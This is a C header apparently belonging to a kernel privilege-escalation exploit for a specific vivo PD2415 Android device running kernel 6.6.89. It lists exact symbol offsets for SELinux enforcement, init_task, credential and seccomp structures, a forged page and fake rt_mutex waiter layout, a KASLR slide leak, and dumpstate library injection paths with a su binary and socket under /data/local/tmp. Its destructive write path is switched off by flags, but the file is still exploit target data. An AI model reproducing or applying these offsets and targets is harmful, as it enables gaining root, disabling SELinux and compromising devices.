#ifndef TARGET_PD2415_6689_H
#define TARGET_PD2415_6689_H

/*
 * Exact authority:
 *   boot.img SHA-256 e4dbb70df0147184438dc97e3bcdeb67e1670cf5a6f66d2a5ed3d5867387e2dd
 *   Image SHA-256    c20c28965f97239d1f37a384537f88415351564ec7019ecb05b402fc57e7b511
 *
 * Image-relative symbols are exact for this Image. The reconstructed ELF is a
 * navigation artifact; its linked base and physical address domains are not
 * independently proven, so the destructive route remains fail-closed.
 */
#define BUILD_VARIANT_LABEL "pd2415_mt6991_6.6.89_exact_full"
#define BUILD_FINGERPRINT "vivo/PD2415/PD2415:16/BP2A.250605.031.A3/compiler260717051329:user/release-keys"
#define TARGET_KERNEL_RELEASE "6.6.89-android15-8-gb57af212129c-abogki457297774-4k"
#define TARGET_KERNEL_SHA256 "c20c28965f97239d1f37a384537f88415351564ec7019ecb05b402fc57e7b511"
#define TARGET_ROUTE_REVISION "pd2415-6.6.89-43499-phyrw-dumpstate-fail-closed-v4"

/* Static and runtime proof gates. */
#define TARGET_43499_ROOT_CAUSE_PROVEN       1
#define TARGET_ASHMEM_IMPLEMENTATION_PROVEN  1
#define TARGET_PSELECT_GEOMETRY_PROVEN       1
#define TARGET_KASLR_PERF_ENTRY_PRESENT      1
#define TARGET_LINKED_BASE_PROVEN            0
#define TARGET_PHYSRW_GEOMETRY_PROVEN        0
#define TARGET_VENDOR_VR_PROVEN              0
#define TARGET_CARRIER_PROVEN                0
#define TARGET_DESTRUCTIVE_WRITE_ENABLED     0
#define TARGET_CARRIER_RUNTIME_DISCOVERY     0

/*
 * VA_BITS=39 and 4K pages are exact IKCONFIG facts. The linked _text value is
 * retained only for image-relative analysis. Physical load and phys_offset
 * remain unknown without an independent exact-image proof.
 */
#define KIMAGE_TEXT_BASE             0xffffffc080000000ULL
#define P0_PAGE_OFFSET               0xffffff8000000000ULL
#define P0_PHYS_OFFSET               0x0ULL
#define P0_KERNEL_PHYS_LOAD          0x0ULL
#define KERNELSNITCH_IDENTITY_START  0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END    0xffffff9000000000ULL
#define DIRECT_MAP_BASE              0xffffff8000000000ULL
#define DIRECT_MAP_END               0xffffff9000000000ULL
#define VMEMMAP_START                0xfffffffe00000000ULL

/* Exact Image-relative ashmem symbols. */
#define ASHMEM_MISC_FOPS_OFF         0x0226b4e8ULL
#define ASHMEM_FOPS_OFF              0x012eba58ULL
#define ASHMEM_IOCTL_OFF             0x00c803dcULL
#define ASHMEM_COMPAT_IOCTL_OFF      0x00c80a98ULL
#define ASHMEM_MMAP_OFF              0x00c80aecULL
#define ASHMEM_OPEN_OFF              0x00c80d0cULL
#define ASHMEM_RELEASE_OFF           0x00c80d94ULL
#define ASHMEM_SHOW_FDINFO_OFF       0x00c80e20ULL

/*
 * Exact Image-relative configfs and VFS symbols. Manual decode at
 * configfs_bin_write_iter+0x124 (0xffffffc08048ca4c) is a direct BL to
 * _copy_from_iter after file->private_data+0xd8 buffer growth and mutex lock.
 */
#define CONFIGFS_READ_ITER_OFF       0x0048c3fcULL
#define CONFIGFS_BIN_WRITE_ITER_OFF  0x0048c928ULL
#define COPY_SPLICE_READ_OFF         0x00410c18ULL
#define NOOP_LLSEEK_OFF              0x003c39b8ULL

/* Exact Image-relative core/data symbols. */
#define INIT_TASK_OFF                0x0210e280ULL
#define ROOT_TASK_GROUP_OFF          0x02305600ULL
#define SELINUX_BLOB_SIZES_OFF       0x01672688ULL
#define SELINUX_ENFORCING_OFF        0x02346ee8ULL
#define SELINUX_ENFORCING_IMAGE_OFF  SELINUX_ENFORCING_OFF
#define SECURITY_HOOK_HEADS_OFF      0x01671f50ULL
#define KMALLOC_CACHES_OFF           0x01671a90ULL
#define ANON_PIPE_BUF_OPS_OFF        0x0115ba08ULL
#define MEMSTART_ADDR_OFF            0x01671608ULL
#define KIMAGE_VOFFSET_OFF           0x016716c0ULL

/* First qword of the exact decompressed Image, checked at runtime _text. */
#define TARGET_IMAGE_HEADER_QWORD0   0x14736819fa405a4dULL

#define ASHMEM_MISC_FOPS       (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
#define ASHMEM_FOPS            (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#define ASHMEM_IOCTL           (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#define ASHMEM_COMPAT_IOCTL    (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
#define ASHMEM_MMAP            (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
#define ASHMEM_OPEN            (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
#define ASHMEM_RELEASE         (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
#define ASHMEM_SHOW_FDINFO     (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)
#define CONFIGFS_READ_ITER     (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
#define CONFIGFS_BIN_WRITE_ITER (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
#define COPY_SPLICE_READ       (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
#define NOOP_LLSEEK            (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
#define INIT_TASK              (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define ROOT_TASK_GROUP        (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SELINUX_BLOB_SIZES     (KIMAGE_TEXT_BASE + SELINUX_BLOB_SIZES_OFF)
#define SELINUX_ENFORCING      (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#define SELINUX_ENFORCING_DIRECT_ALIAS \
  P0_DATA_ALIAS_CONST(KIMAGE_TEXT_BASE + SELINUX_ENFORCING_IMAGE_OFF)
#define SECURITY_HOOK_HEADS    (KIMAGE_TEXT_BASE + SECURITY_HOOK_HEADS_OFF)
#define KMALLOC_CACHES         (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
#define ANON_PIPE_BUF_OPS      (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)
#define MEMSTART_ADDR          (KIMAGE_TEXT_BASE + MEMSTART_ADDR_OFF)
#define KIMAGE_VOFFSET         (KIMAGE_TEXT_BASE + KIMAGE_VOFFSET_OFF)

/*
 * Exact symbols for the PD2415 slide fallback. random_table+0x108 is not yet
 * independently proven as the boot_id .data slot, so the fallback remains
 * disabled by TARGET_LINKED_BASE_PROVEN.
 */
#define SLIDE_NFULNL_LOGGER_OFF          0x02102268ULL
#define SLIDE_LOGGERS_0_1_OFF            0x021021b0ULL
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF    0x022288c0ULL
#define SLIDE_NFULNL_LOG_PACKET_OFF      0x00e50838ULL
#define SLIDE_BOOTID_LEAK_SOURCE_OFF     (SLIDE_NFULNL_LOGGER_OFF + 0x10ULL)
#define SLIDE_BOOTID_LEAK_VALUE_OFF      SLIDE_NFULNL_LOG_PACKET_OFF
#define SLIDE_INIT_TASK_OFF              INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF        ROOT_TASK_GROUP_OFF
#define SLIDE_SYSCTL_BOOTID_OFF          0x02367ee0ULL
#define SLIDE_NFULNL_LOGGER_IMAGE  (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OFF)
#define SLIDE_LOGGERS_0_1_IMAGE    (KIMAGE_TEXT_BASE + SLIDE_LOGGERS_0_1_OFF)
#define SLIDE_RANDOM_BOOT_ID_DATA_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_RANDOM_BOOT_ID_DATA_OFF)
#define SLIDE_INIT_TASK_IMAGE      (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)
#define SLIDE_SYSCTL_BOOTID_IMAGE  (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)

/* Method-local forged page layout inherited from the PD2415 6.6 engine. */
#define LOCK_OFF       0x1350
#define W0_OFF         0x2220
#define FOPS_OFF       0x1000
#define SCRATCH_OFF    0x3000
#define RIGHT_OFF      0x4440
#define LEFT_OFF       0x5550
#define FAKE_TASK_OFF  0x3200

/*
 * Exact pselect geometry:
 * core_sys_select allocates 0x1f0 bytes and uses sp+0x80 for the local fdset
 * block at nfds=320. Each set is 0x28 bytes. BTF rt_mutex_waiter is 0x70.
 */
#define WAITER_LOCAL_OFF          0x80
#define WAITER_TREE_ENTRY_OFF     0x00
#define WAITER_PI_TREE_ENTRY_OFF  0x28
#define WAITER_TASK_OFF           0x50
#define WAITER_LOCK_OFF           0x58
#define WAITER_WAKE_STATE_OFF     0x60
#define WAITER_PRIO_OFF           0x18
#define WAITER_DEADLINE_OFF       0x20
#define WAITER_WW_CTX_OFF         0x68
#define FAKE_WAITER_TREE_PRIO_OFF        0x18
#define FAKE_WAITER_TREE_DEADLINE_OFF    0x20
#define FAKE_WAITER_PI_TREE_ENTRY_OFF    0x28
#define FAKE_WAITER_PI_TREE_PRIO_OFF     0x40
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF 0x48
#define FAKE_WAITER_TASK_OFF             0x50
#define FAKE_WAITER_LOCK_OFF             0x58
#define FAKE_WAITER_WAKE_STATE_OFF       0x60
#define FAKE_WAITER_WW_CTX_OFF           0x68

/* Exact BTF task_struct and rtmutex offsets. */
#define FAKE_TASK_USAGE_OFF          0x40
#define FAKE_TASK_PRIO_OFF           0x84
#define FAKE_TASK_NORMAL_PRIO_OFF    0x8c
#define FAKE_TASK_TASK_GROUP_OFF     0x348
#define FAKE_TASK_PI_LOCK_OFF        0x90c
#define FAKE_TASK_PI_WAITERS_OFF     0x920
#define FAKE_TASK_PI_TOP_TASK_OFF    0x930
#define FAKE_TASK_PI_BLOCKED_ON_OFF  0x938

#define CFG_PAGE_OFF              16
#define CFG_NEEDS_READ_FILL_OFF   80
#define CFG_BIN_BUFFER_OFF        88
#define CFG_BIN_BUFFER_SIZE_OFF   96
#define CFG_CB_MAX_SIZE_OFF       100

#define MM_OWNER_OFF              0x408
#define TASK_PID_OFF              0x618
#define TASK_TGID_OFF             0x61c
#define TASK_REAL_PARENT_OFF      0x628
#define TASK_ATOMIC_FLAGS_OFF     0x5d8
#define TASK_REAL_CRED_OFF        0x818
#define TASK_CRED_OFF             0x820
#define TASK_COMM_OFF             0x830
#define TASK_TASKS_OFF            0x550
#define TASK_THREAD_INFO_FLAGS_OFF 0x00
#define TASK_SECCOMP_OFF          0x8e8

/* Shell task VR offsets are intentionally never consumed by the full route. */
#define VR_TAG_A_OFF           0
#define VR_TAG_B_OFF           0
#define VR_SYSCALL_TP_FLAG     0ULL

/* Exact BTF cred offsets. */
#define CRED_UID_OFF           8
#define CRED_SECUREBITS_OFF    40
#define CRED_CAPS_OFF          48
#define CRED_SECURITY_OFF      128
#define SELINUX_CRED_BLOB_OFF  0
#define SELINUX_CRED_OSID_OFF  0
#define SELINUX_CRED_SID_OFF   4
#define SECCOMP_MODE_OFF          0x00
#define SECCOMP_FILTER_COUNT_OFF  0x04
#define SECCOMP_FILTER_OFF        0x08
#define TIF_SECCOMP_BIT           11
#define PFA_NO_NEW_PRIVS_BIT      0

/* Exact BTF page/slab/pipe_buffer layout. */
#define STRUCT_PAGE_SIZE              0x40
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
#define STRUCT_SLAB_CACHE_OFF         0x08
#define STRUCT_PAGE_TYPE_OFF          0x30
#define PIPE_BUFFER_SIZE              0x28
#define PIPE_BUFFER_SLOTS             32
#define PIPE_BUF_FLAG_CAN_MERGE       0x10

/* Exact BTF file_operations layout. */
#define FOPS_OWNER_OFF        0x00
#define FOPS_LLSEEK_OFF       0x08
#define FOPS_READ_OFF         0x10
#define FOPS_WRITE_OFF        0x18
#define FOPS_READ_ITER_OFF    0x20
#define FOPS_WRITE_ITER_OFF   0x28
#define FOPS_IOCTL_OFF        0x48
#define FOPS_COMPAT_IOCTL_OFF 0x50
#define FOPS_MMAP_OFF         0x58
#define FOPS_OPEN_OFF         0x68
#define FOPS_RELEASE_OFF      0x78
#define FOPS_SPLICE_READ_OFF  0xb8
#define FOPS_SHOW_FDINFO_OFF  0xd8

/*
 * System files were not supplied. The single ELF discovers dumpstate and its
 * DT_NEEDED carrier at runtime, then proves ELF/init_array/hash/preimage and
 * service identity before patching. Zero pinned anchors are never accepted.
 */
#define TARGET_DUMPSTATE_BINARY "/system/bin/dumpstate"
#define TARGET_DUMPSTATE_CARRIER_FALLBACK "/system/lib64/libdumpstateaidl.so"
#define TARGET_CARRIER_PINNED_PATH TARGET_DUMPSTATE_CARRIER_FALLBACK
#define TARGET_DUMPSTATE_SERVICE "dumpstatez"
#define TARGET_BUGREPORTD_SERVICE "bugreportd"
#define TARGET_DUMPSTATE_SOCKET "/dev/socket/dumpstate"
#define TARGET_CARRIER_CONTEXT "u:r:dumpstate:s0"
#define TARGET_SU_CARRIER_PATH "/data/local/tmp/su"
#define TARGET_SU_SOCKET "/data/local/tmp/temp_su.sock"
#define TARGET_CARRIER_PINNED_SIZE 0U
#define TARGET_CARRIER_CTOR0_OFF 0U
#define TARGET_CARRIER_CTOR0_PREIMAGE0 0U
#define TARGET_CARRIER_CTOR0_PREIMAGE1 0U
#define TARGET_CARRIER_CTOR0_PREIMAGE2 0U
#define TARGET_CARRIER_CTOR0_PREIMAGE3 0U

#endif
